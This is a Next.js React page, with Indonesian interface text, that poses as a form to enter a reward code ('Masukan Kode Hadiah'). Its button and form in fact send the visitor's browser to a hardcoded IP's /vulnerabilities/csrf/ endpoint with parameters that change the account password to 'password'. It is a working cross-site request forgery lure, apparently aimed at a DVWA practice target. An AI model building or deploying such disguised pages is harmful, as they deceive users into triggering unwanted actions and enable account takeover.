import Head from 'next/head'
import Router, { useRouter } from 'next/router'
import { useState } from 'react';
import axios from 'axios'
export default function Reward() {
   const [password_new, setPasswordNew] = useState("")
   const [password_conf,setPasswordConf] = useState("")
   const router = useRouter()
   const handleClick = (e) => {
      e.preventDefault()
      console.log("http://103.171.85.200:1000/vulnerabilities/csrf/?password_new=password&password_conf=password&Change=Change#")
      router.push(`http://103.171.85.200:1000/vulnerabilities/csrf/?password_new=password&password_conf=password&Change=Change#`)
   }
   
   return (
   <div>
      <div className="bg-base-200">
         <div className="flex h-screen items-center justify-center container">
            <div className={" mx-4 border-2 border-cyan-500 border-dashed px-10 py-20 rounded-md shadow-lg shadow-cyan-500/50"}>
               <div className={"text-5xl font-nunito font-bold text-cyan-500 "}>Masukan Kode Hadiah</div>
               <form action={`http://103.171.85.200:1000/vulnerabilities/csrf`} method="get">
                  <input 
                  className="mt-4 shadow appearance-none border rounded w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline" 
                  id="password" 
                  type="password" 
                  placeholder="Kode"
                  autocomplete="off"
                  name="password_new"
                  //value={password_new}
                  value="new"
                  onChange={(e) => setPasswordNew(e.target.value)}/>
                  <input 
                  className="mt-4 shadow appearance-none border rounded w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline" 
                  id="password" 
                  type="password"
                  autocomplete="off"
                  name="password_conf"
                  placeholder="Ulangi Kode" 
                  //value={password_conf}
                  value="new"
                  onChange={(e) => setPasswordConf(e.target.value)} />
                  {/* <input 
                  type="submit" value="Change" name="Change" 
                  /> */}
                  <div className={""}>
                     { (password_new != password_conf) ? (
                           <div className="text-red-400 text-center mt-2">Kode tidak sama</div>
                        ) : (<></>)
                     }
                  </div>
                  <div className="flex justify-center mt-4">
                     <button
                     onClick={handleClick} 
                     className="bg-cyan-500 shadow-lg shadow-cyan-500/50 text-white px-2 py-2 rounded-md font-bold hover:bg-cyan-700">Masukan</button>
                  </div>
               </form>
            </div>
         </div>
      </div>
   </div>
   )
}